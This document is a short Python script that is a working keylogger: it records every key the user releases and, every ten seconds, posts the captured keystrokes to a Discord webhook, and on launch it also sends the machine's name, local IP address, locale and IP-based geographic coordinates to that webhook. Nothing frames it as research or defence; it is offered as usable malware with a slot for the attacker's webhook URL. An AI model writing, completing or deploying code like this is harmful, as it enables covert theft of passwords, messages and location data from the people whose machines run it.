import keyboard
import time
import requests
import threading
import os
import socket
import locale
import geocoder
import signal

user_locale = locale.getdefaultlocale()
device_name = os.getenv('COMPUTERNAME')
ip_address = socket.gethostbyname(socket.gethostname())

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'here'

def send_message_to_discord(message):
    payload = {
        'content': message
    }
    requests.post(WEBHOOK_URL, data=payload)

keylogs = []

def send_keylogs():
    global keylogs
    if keylogs:
        keylogs_str = '\n'.join(keylogs)
        payload = {
            'content': keylogs_str
        }
        requests.post(WEBHOOK_URL, data=payload)
        keylogs.clear()
    threading.Timer(10, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs
    keylogs.append(event.name)

def on_exit(sig, frame):
    send_message_to_discord("random closed it")
    exit(0)

signal.signal(signal.SIGTERM, on_exit)
signal.signal(signal.SIGINT, on_exit)

keyboard.on_release(callback=capture_keystrokes)

def get_pc_coordinates():
    g = geocoder.ip('me')
    return g.latlng

send_message_to_discord("Device Name: " + device_name)
send_message_to_discord("IP Address: " + ip_address)
send_message_to_discord("User Locale: " + user_locale[0])
send_message_to_discord("PC Coordinates: " + str(get_pc_coordinates()))
send_message_to_discord("random runned it")

send_keylogs()

while True:
    time.sleep(1)
